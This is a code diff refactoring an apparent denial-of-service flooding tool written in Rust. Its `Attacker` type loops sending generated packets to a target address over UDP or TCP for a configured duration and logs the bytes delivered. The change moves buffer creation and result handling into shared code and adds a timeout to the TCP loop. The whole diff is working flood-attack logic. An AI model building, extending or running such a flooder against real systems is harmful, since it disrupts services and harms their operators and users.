@@ -468,9 +468,13 @@ impl Attacker {
                     attack_method.to_str().to_uppercase()
                 );
 
+                let buffer = self.generate_buffer();
+
                 match attack_method {
-                    AttackMethod::Udp => self.attack_udp(start, sender, socket_address),
-                    AttackMethod::Tcp => self.attack_tcp(start, socket_address),
+                    AttackMethod::Udp => {
+                        self.attack_udp(start, sender, socket_address, buffer.as_slice())
+                    }
+                    AttackMethod::Tcp => self.attack_tcp(start, socket_address, buffer.as_slice()),
                 }
             });
 
@@ -479,7 +483,13 @@ impl Attacker {
         }
     }
 
-    fn attack_udp(&self, start: Instant, sender: SocketAddr, socket_address: &String) {
+    fn attack_udp(
+        &self,
+        start: Instant,
+        sender: SocketAddr,
+        socket_address: &String,
+        buffer: &[u8],
+    ) {
         let attack_method: AttackMethod = AttackMethod::Udp;
         let attack_method_str: String = attack_method.to_str().to_uppercase();
 
@@ -487,8 +497,6 @@ impl Attacker {
 
         info!("Creating socket for {} ...", sender);
         let socket = UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));
-
-        let buffer = self.generate_buffer();
 
         while start.elapsed().as_secs() < self.config.execution_time {
             match socket.connect(socket_address.clone()) {
@@ -499,29 +507,13 @@ impl Attacker {
                         self.add_to_summary(socket_address.clone(), attack_method);
                     }
 
-                    match socket.send(buffer.as_slice()) {
-                        std::result::Result::Ok(size) => {
-                            info!(
-                                "Successfully sent a packet of size {} to {} using {} method",
-                                size, socket_address, attack_method_str
-                            );
-
-                            self.update_summary(
-                                socket_address.clone(),
-                                attack_method,
-                                size as u128,
-                            );
-                        }
-                        std::result::Result::Err(error) => {
-                            error!(
-                                "Failed to send a packet to {} using {} method.\nError message: {}",
-                                socket_address, attack_method_str, error
-                            );
-
-                            if self.config.unreachable_stop_trying {
-                                break;
-                            }
-                        }
+                    if !self.check_result(
+                        socket.send(buffer),
+                        socket_address.clone(),
+                        attack_method,
+                        attack_method_str.clone(),
+                    ) {
+                        break;
                     }
 
                     sleep(self.config.timeout);
@@ -538,7 +530,7 @@ impl Attacker {
         }
     }
 
-    fn attack_tcp(&self, start: Instant, socket_address: &String) {
+    fn attack_tcp(&self, start: Instant, socket_address: &String, buffer: &[u8]) {
         let attack_method: AttackMethod = AttackMethod::Tcp;
         let attack_method_str: String = AttackMethod::Tcp.to_str().to_uppercase();
 
@@ -578,29 +570,17 @@ impl Attacker {
             }
         }
 
-        let buffer = self.generate_buffer();
-
         while start.elapsed().as_secs() < self.config.execution_time {
-            match stream.write(buffer.as_slice()) {
-                std::result::Result::Ok(size) => {
-                    info!(
-                        "Successfully sent a packet of size {} to {} using {} method",
-                        size, socket_address, attack_method_str
-                    );
-
-                    self.update_summary(socket_address.clone(), attack_method, size as u128);
-                }
-                std::result::Result::Err(error) => {
-                    error!(
-                        "Failed to send a packet to {} using {} method.\nError message: {}",
-                        socket_address, attack_method_str, error
-                    );
-
-                    if self.config.unreachable_stop_trying {
-                        break;
-                    }
-                }
+            if !self.check_result(
+                stream.write(buffer),
+                socket_address.clone(),
+                attack_method,
+                attack_method_str.clone(),
+            ) {
+                break;
             }
+
+            sleep(self.config.timeout);
         }
     }
 
@@ -627,6 +607,35 @@ impl Attacker {
 
                 socket_summary
             });
+        }
+    }
+
+    fn check_result(
+        &self,
+        res: std::io::Result<usize>,
+        socket_address: String,
+        attack_method: AttackMethod,
+        attack_method_str: String,
+    ) -> bool {
+        match res {
+            std::result::Result::Ok(size) => {
+                info!(
+                    "Successfully sent a packet of size {} to {} using {} method",
+                    size, socket_address, attack_method_str
+                );
+
+                self.update_summary(socket_address.clone(), attack_method, size as u128);
+
+                true
+            }
+            std::result::Result::Err(error) => {
+                error!(
+                    "Failed to send a packet to {} using {} method.\nError message: {}",
+                    socket_address, attack_method_str, error
+                );
+
+                !self.config.unreachable_stop_trying
+            }
         }
     }
 
